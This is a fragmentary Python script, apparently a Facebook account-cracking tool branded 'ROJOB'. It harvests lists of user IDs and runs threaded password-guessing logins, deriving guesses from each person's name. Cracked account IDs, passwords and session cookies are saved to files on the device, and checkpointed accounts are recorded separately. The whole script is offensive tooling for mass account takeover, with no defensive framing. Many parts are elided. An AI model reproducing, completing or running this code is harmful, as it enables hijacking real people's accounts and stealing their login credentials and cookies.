...
from concurrent.futures import ThreadPoolExecutor as rojobssb
from string import * 
...
sys.stdout.write('\x1b]2; ROJOB\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            ROJOB
\033[1;37m Facebook:            ROJOB ALI
\033[1;37m Github  :            rojob-RB
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    oks.append(sid)
                    open('/sdcard/ROJOB_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/ROJOB_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [ROJOB-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/ROJOB_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ROJOB] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [ROJOB-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/ROJOB_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/ROJOB_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [ROJOB-CP] {sid} | {ps} {S}")
                    cps.append(sid)
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [ROJOB-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/ROJOB_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with rojobssb(max_workers=30) as ssbworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/ROJOB.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/ROJOB.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    print(" ")
    rojob = input('Saving Put File Name :')
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/ROJOB.txt\n') 
        filepath = input("Put File Name: ")
